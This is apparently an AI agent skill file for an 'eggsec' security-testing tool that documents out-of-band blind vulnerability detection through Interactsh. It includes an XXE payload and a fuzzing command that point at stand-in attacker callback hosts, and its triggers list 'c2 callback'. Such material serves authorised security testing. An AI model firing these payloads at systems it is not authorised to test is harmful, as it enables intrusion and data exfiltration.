---
name: oast_integration
description: "Out-of-Band Application Security Testing using Interactsh for blind vulnerability detection"
triggers:
  - oast
  - out-of-band
  - interactsh
  - blind vulnerability
  - ssrf detection
  - blind xss
  - c2 callback
metadata:
  category: fuzzing
  tools: [oast, fuzzer]
  scope: targets
---

## Overview

OAST (Out-of-Band Application Security Testing) integration enables detection of blind vulnerabilities that cannot be observed through normal in-band responses. This is particularly useful for:
- Blind SQL Injection
- Blind XSS
- SSRF (Server-Side Request Forgery)
- XXE with out-of-band data exfiltration
- Time-based vulnerabilities

## Capabilities

- **Interactsh Integration**: Uses Interactsh API for callback infrastructure
- **Unique Interaction URLs**: Generates unique callback URLs per payload
- **Correlation Tracking**: Associates payloads with observed interactions
- **Multiple Protocols**: HTTP, HTTPS, DNS, SMTP, etc.
- **Polling Mechanism**: Periodic polling for interaction detection

## Key Types

```rust
// OAST Tool implementing SecurityTool trait
pub struct OastTool {
    client: Client,
    interactsh_url: String,
    correlation_ids: HashMap<String, OastCorrelation>,
}

pub struct OastPayload {
    pub interaction_url: String,
    pub correlation_id: String,
    pub payload_type: PayloadType,
    pub timestamp: DateTime<Utc>,
}

pub struct OastResult {
    pub correlation_id: String,
    pub interaction_type: InteractionType,
    pub target: String,
    pub timestamp: DateTime<Utc>,
    pub evidence: String,
}
```

## Usage

### CLI Usage

```bash
# Start OAST listener
eggsec oast --server interactsh.com --port 443

# Test for blind SSRF
eggsec fuzz --target http://example.com --oast --callback-url http://attacker.com

# Test for blind XSS
eggsec fuzz --target http://example.com --oast --blind-xss
```

### API Usage

```rust
use eggsec::tool::implementations::oast::{OastTool, OastConfig};

let config = OastConfig {
    interactsh_server: "interactsh.com".to_string(),
    poll_interval_secs: 5,
    correlation_timeout_secs: 300,
};

let tool = OastTool::new(config)?;
let result = tool.execute(target, payload).await?;
```

## Integration with Fuzzer

The OAST tool integrates with the fuzzing engine:

```rust
// XXE with OAST callback
let payload = r#"<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://callback.attacker.com/xxe">]>
<foo>&xxe;</foo>"#;

// The fuzzer will:
1. Generate unique interaction URL
2. Inject correlation ID into payload
3. Send payload to target
4. Poll for interactions at callback server
5. Report finding if interaction observed
```

## Triggers

Keywords that activate this skill: `oast`, `out-of-band`, `interactsh`, `blind vulnerability`, `ssrf detection`, `blind xss`, `c2 callback`